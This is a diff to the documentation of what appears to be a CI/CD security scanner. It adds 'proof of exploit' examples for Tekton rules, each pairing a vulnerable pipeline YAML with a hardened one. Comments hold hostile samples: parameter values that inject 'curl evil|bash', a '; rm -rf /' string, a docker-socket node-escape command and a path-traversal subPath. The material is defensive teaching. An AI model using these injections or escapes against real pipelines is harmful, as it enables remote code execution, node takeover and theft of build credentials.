@@ -12157,6 +12157,66 @@ Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { n
 
 - If the producer task runs a sanitiser between the tainted ``$(params.X)`` interpolation and the ``$(results.Y.path)`` write, the consumer is no longer exploitable but TAINT-006 still fires. Suppress via ignore-file scoped to the consumer task name when this is the deliberate shape; the sanitiser is then load-bearing.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: Task ``extract`` writes the PR title to a
+# Tekton ``result``; Task ``use`` reads it back and
+# inlines it into a shell command. A PipelineRun whose
+# upstream provides ``feat;curl evil|bash;`` for the
+# title lands the metacharacters in ``use``'s shell.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  params:
+    - name: pr-title
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            script: |
+              echo -n "$(params.title)" > $(results.clean-title.path)
+      params:
+        - { name: title, value: $(params.pr-title) }
+    - name: use
+      runAfter: [extract]
+      taskSpec:
+        params: [{ name: title }]
+        steps:
+          - name: use
+            image: alpine@sha256:abc123...
+            script: |
+              ./gen-notes --title $(params.title)
+      params:
+        - { name: title, value: $(tasks.extract.results.clean-title) }
+
+# Safe: sanitise at the producer Task (strip metacharacters
+# to an expected charset) before writing the result, and
+# bind the consumer's param to a shell env var that's
+# quoted on every use. The injected ``;`` / backticks
+# either never reach the result or are quoted away.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            env:
+              - { name: RAW, value: $(params.title) }
+            script: |
+              echo -n "$RAW" | tr -dc 'a-zA-Z0-9 -' \
+                > $(results.clean-title.path)
+```
+
 **Source:** [`TAINT-006`](../providers/tekton.md#taint-006) in the [Tekton provider](../providers/tekton.md).
 
 ### `TAINT-007`: Untrusted input flows across templates via Argo ``outputs.parameters`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-007 }
@@ -12440,6 +12500,35 @@ resource "aws_route_table_association" "build" {
 
 **Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ubuntu:22.04`` is a mutable tag. Whoever
+# controls the registry can repoint it on the next 22.04.x
+# refresh; the next TaskRun pulls the swap silently.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu:22.04
+      script: |
+        make build
+
+# Safe: pin to the immutable sha256 digest. The leading
+# comment documents which tag the digest corresponds to.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu@sha256:abc123...  # ubuntu:22.04, refreshed YYYY-MM-DD
+      script: |
+        make build
+```
+
 **Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-002`: Tekton step runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-002 }
@@ -12449,6 +12538,42 @@ resource "aws_route_table_association" "build" {
 **How this is detected.** Detection fires on a step with ``securityContext.privileged: true``, ``securityContext.runAsUser: 0``, ``securityContext.runAsNonRoot: false``, ``securityContext.allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.
 
 **Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every step. A privileged step shares the node's kernel namespaces; a malicious or compromised step image then has root on the build node, breaking the boundary between build and cluster.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``securityContext.privileged: true`` gives
+# the step container full kernel-namespace access on the
+# node. A workload compromise becomes a node-level shell
+# with reach into every other pod on the node.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: builder@sha256:abc123...
+      securityContext:
+        privileged: true
+
+# Safe: explicit non-root + privilege-escalation off,
+# all caps dropped, read-only root filesystem. The step
+# cannot bind a privileged port or modify its own image
+# layer at runtime.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: builder@sha256:abc123...
+      securityContext:
+        privileged: false
+        allowPrivilegeEscalation: false
+        runAsNonRoot: true
+        runAsUser: 10001
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: ["ALL"]
+```
 
 **Source:** [`TKN-002`](../providers/tekton.md#tkn-002) in the [Tekton provider](../providers/tekton.md).
 
@@ -12460,6 +12585,48 @@ resource "aws_route_table_association" "build" {
 
 **Recommendation.** Don't interpolate ``$(params.<name>)`` directly into the step ``script:``. Tekton substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Receive the parameter through ``env:`` (``valueFrom: ...`` or ``value: $(params.<name>)``) and reference the env var quoted in the script (``"$NAME"``); or pass it as a positional argument to a shell function.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``$(params.revision)`` is substituted into
+# the script literally before the shell parses it. A
+# PipelineRun whose ``revision`` param is
+# ``main";curl evil|bash;"`` executes the injected curl
+# in the step's shell context.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: clone }
+spec:
+  params:
+    - name: revision
+      type: string
+  steps:
+    - name: clone
+      image: alpine/git@sha256:abc123...
+      script: |
+        git clone https://github.com/org/repo --branch $(params.revision)
+
+# Safe: bind the param to a shell variable via ``env`` and
+# quote it on every use. Tekton expands ``$(params.*)`` at
+# template time; shell quoting defends only at the shell
+# layer, so the indirection through env is what matters.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: clone }
+spec:
+  params:
+    - name: revision
+      type: string
+  steps:
+    - name: clone
+      image: alpine/git@sha256:abc123...
+      env:
+        - name: REVISION
+          value: $(params.revision)
+      script: |
+        git clone https://github.com/org/repo --branch "$REVISION"
+```
+
 **Source:** [`TKN-003`](../providers/tekton.md#tkn-003) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-004`: Tekton Task mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-004 }
@@ -12469,6 +12636,44 @@ resource "aws_route_table_association" "build" {
 **How this is detected.** Checks ``spec.volumes[].hostPath`` (legacy v1beta1 form), ``spec.workspaces[].volumeClaimTemplate.spec.storageClassName == 'hostpath'``, and ``spec.podTemplate`` host-namespace flags.
 
 **Recommendation.** Use Tekton ``workspaces:`` backed by ``emptyDir`` or ``persistentVolumeClaim`` instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` on the Task's ``podTemplate``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the build break out of the pod and act as the underlying node.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: mounting ``/var/run/docker.sock`` into a
+# step gives the Task root access to the node's Docker
+# API. ``docker run --privileged -v /:/host`` from inside
+# the step then owns the entire node — kubelet creds,
+# every other pod's filesystem.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build-image }
+spec:
+  volumes:
+    - name: docker-sock
+      hostPath: { path: /var/run/docker.sock }
+  steps:
+    - name: build
+      image: docker:24
+      volumeMounts:
+        - { name: docker-sock, mountPath: /var/run/docker.sock }
+      script: |
+        docker build -t app .
+
+# Safe: Kaniko sandboxed build in an emptyDir workspace.
+# No node-level access, no host-path mount.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build-image }
+spec:
+  volumes:
+    - name: scratch
+      emptyDir: {}
+  steps:
+    - name: build
+      image: gcr.io/kaniko-project/executor@sha256:abc123...
+      args: [--context=., --destination=registry/app:tag]
+```
 
 **Source:** [`TKN-004`](../providers/tekton.md#tkn-004) in the [Tekton provider](../providers/tekton.md).
 
@@ -12481,6 +12686,47 @@ resource "aws_route_table_association" "build" {
 **Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``params[].default``. Task manifests are committed to git and cluster-readable; literal values leak through normal access paths.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in the
+# Task manifest. ``kubectl get task -o yaml`` exposes it;
+# the manifest is committed to git for any repo reader.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: upload }
+spec:
+  steps:
+    - name: upload
+      image: aws-cli@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          value: AKIAIOSFODNN7EXAMPLE
+        - name: AWS_SECRET_ACCESS_KEY
+          value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+      script: aws s3 cp ./build s3://bucket/
+
+# Safe: reference a Kubernetes Secret via
+# ``valueFrom.secretKeyRef``. The Task manifest carries
+# the secret's name, not its value; the value lives in
+# the cluster's Secret store and can rotate without a
+# Task change.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: upload }
+spec:
+  steps:
+    - name: upload
+      image: aws-cli@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          valueFrom:
+            secretKeyRef: { name: aws-uploader, key: access_key_id }
+        - name: AWS_SECRET_ACCESS_KEY
+          valueFrom:
+            secretKeyRef: { name: aws-uploader, key: secret_access_key }
+```
 
 **Source:** [`TKN-005`](../providers/tekton.md#tkn-005) in the [Tekton provider](../providers/tekton.md).
 
@@ -12517,6 +12763,39 @@ resource "aws_route_table_association" "build" {
 **Known false positives.**
 
 - Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts the network path AND
+# the installer host. A MITM (compromised proxy, malicious
+# DNS) or a publisher compromise ships malicious code into
+# the step's shell with the step's full credential set
+# in scope (TaskRun ServiceAccount, mounted Secrets).
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify against a known-good sha256, then
+# execute. If the upstream content changes, the digest
+# stops matching and the step fails loud.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        set -e
+        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+        bash /tmp/cli.sh
+```
 
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
@@ -12572,6 +12851,39 @@ resource "aws_route_table_association" "build" {
 
 - Tasks that genuinely need ``docker:dind`` as a sidecar, e.g. building images inside the cluster without giving the step itself host-Docker access. The replacement pattern is Kaniko or BuildKit running as the step itself, with no privileged sidecar; if neither is viable, ignore TKN-013 in ``.pipeline-check-ignore.yml`` for the affected Task.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a sidecar runs alongside every step in the
+# Task and shares the pod's volumes / network. A
+# privileged sidecar can escape to the node the same way
+# a privileged step does, with the added attack surface
+# of being long-lived for the Task's whole duration.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  sidecars:
+    - name: docker-daemon
+      image: docker:24-dind
+      securityContext:
+        privileged: true
+  steps:
+    - name: build
+      image: docker:24
+      script: docker build -t app .
+
+# Safe: drop the privileged sidecar and use a rootless
+# builder in the step. Kaniko / BuildKit rootless
+# eliminates the need for the dind sidecar entirely.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: gcr.io/kaniko-project/executor@sha256:abc123...
+      args: [--context=., --destination=registry/app:tag]
+```
+
 **Source:** [`TKN-013`](../providers/tekton.md#tkn-013) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-014`: Tekton step script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-014 }
@@ -12601,6 +12913,46 @@ The detection scans the step-level ``workspaces:`` list (``spec.steps[*].workspa
 **Known false positives.**
 
 - Some teams use a parameter to select between a small set of allowed sub-paths and rely on a step pre-check to reject anything off-list. The rule has no way to see that pre-check; suppress on the specific step name when this is the deliberate shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``$(params.target)`` is substituted into
+# the workspace ``subPath`` literally. A PipelineRun with
+# ``target: ../../../etc/secrets`` (or similar traversal)
+# escapes the intended workspace directory and reads /
+# writes outside it.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  params:
+    - name: target
+  workspaces:
+    - name: shared
+      subPath: $(params.target)
+  steps:
+    - name: write
+      image: alpine@sha256:abc123...
+      script: |
+        echo data > /workspace/shared/out
+
+# Safe: pin the subPath to a static literal or validate
+# the param shape upstream (in the Pipeline) against an
+# allowlist of expected names. Tekton has no built-in
+# path-canonicalisation for subPath, so the gate is on
+# the producer of the param.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  workspaces:
+    - name: shared
+      subPath: artifacts
+  steps:
+    - name: write
+      image: alpine@sha256:abc123...
+      script: |
+        echo data > /workspace/shared/out
+```
 
 **Source:** [`TKN-015`](../providers/tekton.md#tkn-015) in the [Tekton provider](../providers/tekton.md).
 
